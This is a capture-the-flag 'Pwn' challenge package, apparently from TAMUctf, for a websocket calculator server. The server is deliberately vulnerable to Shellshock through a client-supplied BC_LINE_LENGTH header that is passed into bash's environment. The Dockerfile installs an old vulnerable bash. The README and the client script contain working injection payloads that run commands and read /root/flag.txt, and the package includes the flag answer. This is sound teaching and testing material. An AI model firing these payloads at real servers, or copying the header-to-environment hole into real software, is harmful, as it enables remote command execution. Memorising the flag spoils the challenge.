{
    ".gitignore": "target/\n.idea/\nvenv/",
    "Dockerfile": "FROM rust:slim as build\n\nRUN USER=root cargo new --bin calculataser\nWORKDIR /calculataser\n\nCOPY server/Cargo.lock ./Cargo.lock\nCOPY server/Cargo.toml ./Cargo.toml\n\nRUN cargo build --release\nRUN rm src/*.rs\n\nCOPY server/src ./src\n\nRUN rm ./target/release/deps/calculataser*\nRUN cargo build --release\n\nFROM debian:buster-slim\nMAINTAINER Addison Crump \"addisoncrump@tamu.edu\"\n\nRUN apt update; apt -y --autoremove full-upgrade; apt -y install bc libtinfo5 wget\nRUN wget http://snapshot.debian.org/archive/debian/20130101T091755Z/pool/main/b/bash/bash_4.2%2Bdfsg-0.1_amd64.deb -O /tmp/bash_4.2+dfsg-0.1_amd64.deb && \\\n dpkg -i /tmp/bash_4.2+dfsg-0.1_amd64.deb\nRUN apt-get autoremove\nRUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*\n\n# copy the build artifact from the build stage\nCOPY --from=build /calculataser/target/release/calculataser_server /usr/bin/calculataser\nCOPY flag.txt /root/flag.txt\n\nEXPOSE 3012\n\n# set the startup command to run your binary\nCMD [\"/usr/bin/calculataser\"]\n",
    "flag.txt": "gigem{sh0CKd_by_7h3_ca1culatoR}",
    "README.md": "# Calculataser\n\n```text\nWe've spun up an old websocket arbitrary precision calculator from 2014 just bc we can, obviously.\n\nWe made a client for you. Give it a whirl!\n```\n\n## Setup\n\n1. `docker build -t calculataser .`\n2. `docker run --rm -p 3012:3012 -d calculataser`\n\n**We MUST change the client to use the target server address/domain before release**\n\n## Brief Dev Description\n\nA websocket server which invokes bc in a manner which is vulnerable to shellshock (CVE-2014-6271). Users are permitted\nto add their own line length environmental variable, which can be used to invoke commands via shellshock.\n\n## Solution\n\nIt's websocket shell time.\n\n```python\nimport websocket\n\nif __name__ == '__main__':\n    ws = websocket.WebSocket()\n    ws.connect(\"ws://172.17.0.2:3012/\", header=[\"BC_LINE_LENGTH: () { :; }; /bin/cat /root/flag.txt\"])\n\n    ws.send(\"1 + 5\\n\")\n\n    result = ws.recv()\n    print(\"Received '%s'\" % str(result.decode(\"utf-8\")))\n    ws.close()\n```\n\nNote that the injection occurs within the BC_LINE_LENGTH request header. This is not triggerable from a browser, I\npromise.\n\n## Possible Difficulty Enhancements\n\n - It would be possible to configure a response for `OPTIONS` that specifies that the header may be provided, but don't\ntell the user. This might be considered... unfair.\n",
    "client\\client.py": "#!/usr/bin/env python3\n\n# pip install websocket_client\nimport websocket\n\nif __name__ == '__main__':\n    ws = websocket.WebSocket()\n    ws.connect(\"ws://challenges.tamuctf.com:3012/\", header=[\"BC_LINE_LENGTH: () { :; }; /bin/ls\"])\n\n    ws.send(\"1 + 5\\n\")\n\n    result = ws.recv()\n    print(\"Received '%s'\" % str(result.decode(\"utf-8\")))\n    ws.close()\n",
    "server\\Cargo.lock": "# This file is automatically @generated by Cargo.\n# It is not intended for manual editing.\n[[package]]\nname = \"autocfg\"\nversion = \"0.1.6\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"bitflags\"\nversion = \"1.1.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"block-buffer\"\nversion = \"0.7.3\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"block-padding 0.1.4 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"byte-tools 0.3.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"byteorder 1.3.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"generic-array 0.12.3 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"block-padding\"\nversion = \"0.1.4\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"byte-tools 0.3.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"byte-tools\"\nversion = \"0.3.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"byteorder\"\nversion = \"1.3.2\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"bytes\"\nversion = \"0.4.12\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"byteorder 1.3.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"iovec 0.1.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"calculataser_server\"\nversion = \"0.1.0\"\ndependencies = [\n \"ws 0.9.0 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"cfg-if\"\nversion = \"0.1.9\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"cloudabi\"\nversion = \"0.0.3\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"bitflags 1.1.0 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"digest\"\nversion = \"0.8.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"generic-array 0.12.3 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"fake-simd\"\nversion = \"0.1.2\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"fuchsia-cprng\"\nversion = \"0.1.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"fuchsia-zircon\"\nversion = \"0.3.3\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"bitflags 1.1.0 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"fuchsia-zircon-sys 0.3.3 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"fuchsia-zircon-sys\"\nversion = \"0.3.3\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"generic-array\"\nversion = \"0.12.3\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"typenum 1.11.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"httparse\"\nversion = \"1.3.4\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"idna\"\nversion = \"0.2.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"matches 0.1.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"unicode-bidi 0.3.4 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"unicode-normalization 0.1.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"iovec\"\nversion = \"0.1.2\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"libc 0.2.62 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"winapi 0.2.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"kernel32-sys\"\nversion = \"0.2.2\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"winapi 0.2.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"winapi-build 0.1.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"lazycell\"\nversion = \"1.2.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"libc\"\nversion = \"0.2.62\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"log\"\nversion = \"0.4.8\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"cfg-if 0.1.9 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"matches\"\nversion = \"0.1.8\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"mio\"\nversion = \"0.6.19\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"fuchsia-zircon 0.3.3 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"fuchsia-zircon-sys 0.3.3 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"iovec 0.1.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"kernel32-sys 0.2.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"libc 0.2.62 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"log 0.4.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"miow 0.2.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"net2 0.2.33 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"slab 0.4.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"winapi 0.2.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"mio-extras\"\nversion = \"2.0.5\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"lazycell 1.2.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"log 0.4.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"mio 0.6.19 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"slab 0.4.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"miow\"\nversion = \"0.2.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"kernel32-sys 0.2.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"net2 0.2.33 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"winapi 0.2.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"ws2_32-sys 0.2.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"net2\"\nversion = \"0.2.33\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"cfg-if 0.1.9 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"libc 0.2.62 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"winapi 0.3.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"opaque-debug\"\nversion = \"0.2.3\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"percent-encoding\"\nversion = \"2.1.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"rand\"\nversion = \"0.6.5\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"autocfg 0.1.6 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"libc 0.2.62 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"rand_chacha 0.1.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"rand_core 0.4.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"rand_hc 0.1.0 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"rand_isaac 0.1.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"rand_jitter 0.1.4 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"rand_os 0.1.3 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"rand_pcg 0.1.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"rand_xorshift 0.1.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"winapi 0.3.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"rand_chacha\"\nversion = \"0.1.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"autocfg 0.1.6 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"rand_core 0.3.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"rand_core\"\nversion = \"0.3.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"rand_core 0.4.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"rand_core\"\nversion = \"0.4.2\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"rand_hc\"\nversion = \"0.1.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"rand_core 0.3.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"rand_isaac\"\nversion = \"0.1.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"rand_core 0.3.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"rand_jitter\"\nversion = \"0.1.4\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"libc 0.2.62 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"rand_core 0.4.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"winapi 0.3.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"rand_os\"\nversion = \"0.1.3\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"cloudabi 0.0.3 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"fuchsia-cprng 0.1.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"libc 0.2.62 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"rand_core 0.4.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"rdrand 0.4.0 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"winapi 0.3.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"rand_pcg\"\nversion = \"0.1.2\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"autocfg 0.1.6 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"rand_core 0.4.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"rand_xorshift\"\nversion = \"0.1.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"rand_core 0.3.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"rdrand\"\nversion = \"0.4.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"rand_core 0.3.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"sha-1\"\nversion = \"0.8.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"block-buffer 0.7.3 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"digest 0.8.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"fake-simd 0.1.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"opaque-debug 0.2.3 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"slab\"\nversion = \"0.4.2\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"smallvec\"\nversion = \"0.6.10\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"typenum\"\nversion = \"1.11.2\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"unicode-bidi\"\nversion = \"0.3.4\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"matches 0.1.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"unicode-normalization\"\nversion = \"0.1.8\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"smallvec 0.6.10 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"url\"\nversion = \"2.1.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"idna 0.2.0 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"matches 0.1.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"percent-encoding 2.1.0 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"winapi\"\nversion = \"0.2.8\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"winapi\"\nversion = \"0.3.8\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"winapi-i686-pc-windows-gnu 0.4.0 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"winapi-x86_64-pc-windows-gnu 0.4.0 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"winapi-build\"\nversion = \"0.1.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"winapi-i686-pc-windows-gnu\"\nversion = \"0.4.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"winapi-x86_64-pc-windows-gnu\"\nversion = \"0.4.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"ws\"\nversion = \"0.9.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"byteorder 1.3.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"bytes 0.4.12 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"httparse 1.3.4 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"log 0.4.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"mio 0.6.19 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"mio-extras 2.0.5 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"rand 0.6.5 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"sha-1 0.8.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"slab 0.4.2 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"url 2.1.0 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[[package]]\nname = \"ws2_32-sys\"\nversion = \"0.2.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\ndependencies = [\n \"winapi 0.2.8 (registry+https://github.com/rust-lang/crates.io-index)\",\n \"winapi-build 0.1.1 (registry+https://github.com/rust-lang/crates.io-index)\",\n]\n\n[metadata]\n\"checksum autocfg 0.1.6 (registry+https://github.com/rust-lang/crates.io-index)\" = \"b671c8fb71b457dd4ae18c4ba1e59aa81793daacc361d82fcd410cef0d491875\"\n\"checksum bitflags 1.1.0 (registry+https://github.com/rust-lang/crates.io-index)\" = \"3d155346769a6855b86399e9bc3814ab343cd3d62c7e985113d46a0ec3c281fd\"\n\"checksum block-buffer 0.7.3 (registry+https://github.com/rust-lang/crates.io-index)\" = \"c0940dc441f31689269e10ac70eb1002a3a1d3ad1390e030043662eb7fe4688b\"\n\"checksum block-padding 0.1.4 (registry+https://github.com/rust-lang/crates.io-index)\" = \"6d4dc3af3ee2e12f3e5d224e5e1e3d73668abbeb69e566d361f7d5563a4fdf09\"\n\"checksum byte-tools 0.3.1 (registry+https://github.com/rust-lang/crates.io-index)\" = \"e3b5ca7a04898ad4bcd41c90c5285445ff5b791899bb1b0abdd2a2aa791211d7\"\n\"checksum byteorder 1.3.2 (registry+https://github.com/rust-lang/crates.io-index)\" = \"a7c3dd8985a7111efc5c80b44e23ecdd8c007de8ade3b96595387e812b957cf5\"\n\"checksum bytes 0.4.12 (registry+https://github.com/rust-lang/crates.io-index)\" = \"206fdffcfa2df7cbe15601ef46c813fce0965eb3286db6b56c583b814b51c81c\"\n\"checksum cfg-if 0.1.9 (registry+https://github.com/rust-lang/crates.io-index)\" = \"b486ce3ccf7ffd79fdeb678eac06a9e6c09fc88d33836340becb8fffe87c5e33\"\n\"checksum cloudabi 0.0.3 (registry+https://github.com/rust-lang/crates.io-index)\" = \"ddfc5b9aa5d4507acaf872de71051dfd0e309860e88966e1051e462a077aac4f\"\n\"checksum digest 0.8.1 (registry+https://github.com/rust-lang/crates.io-index)\" = \"f3d0c8c8752312f9713efd397ff63acb9f85585afbf179282e720e7704954dd5\"\n\"checksum fake-simd 0.1.2 (registry+https://github.com/rust-lang/crates.io-index)\" = \"e88a8acf291dafb59c2d96e8f59828f3838bb1a70398823ade51a84de6a6deed\"\n\"checksum fuchsia-cprng 0.1.1 (registry+https://github.com/rust-lang/crates.io-index)\" = \"a06f77d526c1a601b7c4cdd98f54b5eaabffc14d5f2f0296febdc7f357c6d3ba\"\n\"checksum fuchsia-zircon 0.3.3 (registry+https://github.com/rust-lang/crates.io-index)\" = \"2e9763c69ebaae630ba35f74888db465e49e259ba1bc0eda7d06f4a067615d82\"\n\"checksum fuchsia-zircon-sys 0.3.3 (registry+https://github.com/rust-lang/crates.io-index)\" = \"3dcaa9ae7725d12cdb85b3ad99a434db70b468c09ded17e012d86b5c1010f7a7\"\n\"checksum generic-array 0.12.3 (registry+https://github.com/rust-lang/crates.io-index)\" = \"c68f0274ae0e023facc3c97b2e00f076be70e254bc851d972503b328db79b2ec\"\n\"checksum httparse 1.3.4 (registry+https://github.com/rust-lang/crates.io-index)\" = \"cd179ae861f0c2e53da70d892f5f3029f9594be0c41dc5269cd371691b1dc2f9\"\n\"checksum idna 0.2.0 (registry+https://github.com/rust-lang/crates.io-index)\" = \"02e2673c30ee86b5b96a9cb52ad15718aa1f966f5ab9ad54a8b95d5ca33120a9\"\n\"checksum iovec 0.1.2 (registry+https://github.com/rust-lang/crates.io-index)\" = \"dbe6e417e7d0975db6512b90796e8ce223145ac4e33c377e4a42882a0e88bb08\"\n\"checksum kernel32-sys 0.2.2 (registry+https://github.com/rust-lang/crates.io-index)\" = \"7507624b29483431c0ba2d82aece8ca6cdba9382bff4ddd0f7490560c056098d\"\n\"checksum lazycell 1.2.1 (registry+https://github.com/rust-lang/crates.io-index)\" = \"b294d6fa9ee409a054354afc4352b0b9ef7ca222c69b8812cbea9e7d2bf3783f\"\n\"checksum libc 0.2.62 (registry+https://github.com/rust-lang/crates.io-index)\" = \"34fcd2c08d2f832f376f4173a231990fa5aef4e99fb569867318a227ef4c06ba\"\n\"checksum log 0.4.8 (registry+https://github.com/rust-lang/crates.io-index)\" = \"14b6052be84e6b71ab17edffc2eeabf5c2c3ae1fdb464aae35ac50c67a44e1f7\"\n\"checksum matches 0.1.8 (registry+https://github.com/rust-lang/crates.io-index)\" = \"7ffc5c5338469d4d3ea17d269fa8ea3512ad247247c30bd2df69e68309ed0a08\"\n\"checksum mio 0.6.19 (registry+https://github.com/rust-lang/crates.io-index)\" = \"83f51996a3ed004ef184e16818edc51fadffe8e7ca68be67f9dee67d84d0ff23\"\n\"checksum mio-extras 2.0.5 (registry+https://github.com/rust-lang/crates.io-index)\" = \"46e73a04c2fa6250b8d802134d56d554a9ec2922bf977777c805ea5def61ce40\"\n\"checksum miow 0.2.1 (registry+https://github.com/rust-lang/crates.io-index)\" = \"8c1f2f3b1cf331de6896aabf6e9d55dca90356cc9960cca7eaaf408a355ae919\"\n\"checksum net2 0.2.33 (registry+https://github.com/rust-lang/crates.io-index)\" = \"42550d9fb7b6684a6d404d9fa7250c2eb2646df731d1c06afc06dcee9e1bcf88\"\n\"checksum opaque-debug 0.2.3 (registry+https://github.com/rust-lang/crates.io-index)\" = \"2839e79665f131bdb5782e51f2c6c9599c133c6098982a54c794358bf432529c\"\n\"checksum percent-encoding 2.1.0 (registry+https://github.com/rust-lang/crates.io-index)\" = \"d4fd5641d01c8f18a23da7b6fe29298ff4b55afcccdf78973b24cf3175fee32e\"\n\"checksum rand 0.6.5 (registry+https://github.com/rust-lang/crates.io-index)\" = \"6d71dacdc3c88c1fde3885a3be3fbab9f35724e6ce99467f7d9c5026132184ca\"\n\"checksum rand_chacha 0.1.1 (registry+https://github.com/rust-lang/crates.io-index)\" = \"556d3a1ca6600bfcbab7c7c91ccb085ac7fbbcd70e008a98742e7847f4f7bcef\"\n\"checksum rand_core 0.3.1 (registry+https://github.com/rust-lang/crates.io-index)\" = \"7a6fdeb83b075e8266dcc8762c22776f6877a63111121f5f8c7411e5be7eed4b\"\n\"checksum rand_core 0.4.2 (registry+https://github.com/rust-lang/crates.io-index)\" = \"9c33a3c44ca05fa6f1807d8e6743f3824e8509beca625669633be0acbdf509dc\"\n\"checksum rand_hc 0.1.0 (registry+https://github.com/rust-lang/crates.io-index)\" = \"7b40677c7be09ae76218dc623efbf7b18e34bced3f38883af07bb75630a21bc4\"\n\"checksum rand_isaac 0.1.1 (registry+https://github.com/rust-lang/crates.io-index)\" = \"ded997c9d5f13925be2a6fd7e66bf1872597f759fd9dd93513dd7e92e5a5ee08\"\n\"checksum rand_jitter 0.1.4 (registry+https://github.com/rust-lang/crates.io-index)\" = \"1166d5c91dc97b88d1decc3285bb0a99ed84b05cfd0bc2341bdf2d43fc41e39b\"\n\"checksum rand_os 0.1.3 (registry+https://github.com/rust-lang/crates.io-index)\" = \"7b75f676a1e053fc562eafbb47838d67c84801e38fc1ba459e8f180deabd5071\"\n\"checksum rand_pcg 0.1.2 (registry+https://github.com/rust-lang/crates.io-index)\" = \"abf9b09b01790cfe0364f52bf32995ea3c39f4d2dd011eac241d2914146d0b44\"\n\"checksum rand_xorshift 0.1.1 (registry+https://github.com/rust-lang/crates.io-index)\" = \"cbf7e9e623549b0e21f6e97cf8ecf247c1a8fd2e8a992ae265314300b2455d5c\"\n\"checksum rdrand 0.4.0 (registry+https://github.com/rust-lang/crates.io-index)\" = \"678054eb77286b51581ba43620cc911abf02758c91f93f479767aed0f90458b2\"\n\"checksum sha-1 0.8.1 (registry+https://github.com/rust-lang/crates.io-index)\" = \"23962131a91661d643c98940b20fcaffe62d776a823247be80a48fcb8b6fce68\"\n\"checksum slab 0.4.2 (registry+https://github.com/rust-lang/crates.io-index)\" = \"c111b5bd5695e56cffe5129854aa230b39c93a305372fdbb2668ca2394eea9f8\"\n\"checksum smallvec 0.6.10 (registry+https://github.com/rust-lang/crates.io-index)\" = \"ab606a9c5e214920bb66c458cd7be8ef094f813f20fe77a54cc7dbfff220d4b7\"\n\"checksum typenum 1.11.2 (registry+https://github.com/rust-lang/crates.io-index)\" = \"6d2783fe2d6b8c1101136184eb41be8b1ad379e4657050b8aaff0c79ee7575f9\"\n\"checksum unicode-bidi 0.3.4 (registry+https://github.com/rust-lang/crates.io-index)\" = \"49f2bd0c6468a8230e1db229cff8029217cf623c767ea5d60bfbd42729ea54d5\"\n\"checksum unicode-normalization 0.1.8 (registry+https://github.com/rust-lang/crates.io-index)\" = \"141339a08b982d942be2ca06ff8b076563cbe223d1befd5450716790d44e2426\"\n\"checksum url 2.1.0 (registry+https://github.com/rust-lang/crates.io-index)\" = \"75b414f6c464c879d7f9babf951f23bc3743fb7313c081b2e6ca719067ea9d61\"\n\"checksum winapi 0.2.8 (registry+https://github.com/rust-lang/crates.io-index)\" = \"167dc9d6949a9b857f3451275e911c3f44255842c1f7a76f33c55103a909087a\"\n\"checksum winapi 0.3.8 (registry+https://github.com/rust-lang/crates.io-index)\" = \"8093091eeb260906a183e6ae1abdba2ef5ef2257a21801128899c3fc699229c6\"\n\"checksum winapi-build 0.1.1 (registry+https://github.com/rust-lang/crates.io-index)\" = \"2d315eee3b34aca4797b2da6b13ed88266e6d612562a0c46390af8299fc699bc\"\n\"checksum winapi-i686-pc-windows-gnu 0.4.0 (registry+https://github.com/rust-lang/crates.io-index)\" = \"ac3b87c63620426dd9b991e5ce0329eff545bccbbb34f3be09ff6fb6ab51b7b6\"\n\"checksum winapi-x86_64-pc-windows-gnu 0.4.0 (registry+https://github.com/rust-lang/crates.io-index)\" = \"712e227841d057c1ee1cd2fb22fa7e5a5461ae8e48fa2ca79ec42cfc1931183f\"\n\"checksum ws 0.9.0 (registry+https://github.com/rust-lang/crates.io-index)\" = \"8a6f5bb86663ff4d1639408410f50bf6050367a8525d644d49a6894cd618a631\"\n\"checksum ws2_32-sys 0.2.1 (registry+https://github.com/rust-lang/crates.io-index)\" = \"d59cefebd0c892fa2dd6de581e937301d8552cb44489cdff035c6187cb63fa5e\"\n",
    "server\\Cargo.toml": "[package]\nname = \"calculataser_server\"\nversion = \"0.1.0\"\nauthors = [\"Addison Crump <addisoncrump@tamu.edu>\"]\nedition = \"2018\"\n\n[dependencies]\nws = \"0.9.0\"\n",
    "server\\src\\main.rs": "extern crate ws;\n\nuse std::io::{Write, stdout};\nuse std::process::{Command, Stdio};\nuse std::str;\n\nuse ws::{Error, Handler, listen, Message, Request, Response, Result, Sender};\n\nstruct Server {\n    out: Sender,\n    line_limit: String,\n}\n\nimpl Handler for Server {\n    fn on_message(&mut self, msg: Message) -> Result<()> {\n        print!(\"{}\", msg.as_text()?);\n        stdout().flush()?;\n\n        let mut child = Command::new(\"bash\").arg(\"-c\").arg(\"bc\")\n            .env(\"BC_LINE_LENGTH\", self.line_limit.as_str())\n            .stdin(Stdio::piped())\n            .stdout(Stdio::piped())\n            .spawn()\n            .ok().expect(\"failed to spawn process\");\n\n        child.stdin.as_mut().unwrap().write_all(msg.into_data().as_ref())?;\n\n        let output = child.wait_with_output()?.stdout;\n        self.out.send(output)\n    }\n\n    fn on_error(&mut self, err: Error) {\n        println!(\"The server encountered an error: {:?}\", err);\n    }\n\n    fn on_request(&mut self, req: &Request) -> Result<Response> {\n        self.line_limit = str::from_utf8(req.header(\"BC_LINE_LENGTH\").unwrap_or(\"100\".as_bytes().to_vec().as_ref()))?.parse().unwrap();\n        Response::from_request(req)\n    }\n}\n\nfn main() {\n    listen(\"0.0.0.0:3012\", |out| { Server { out, line_limit: \"100\".parse().unwrap() } }).unwrap()\n}",
    "category": "Pwn"
}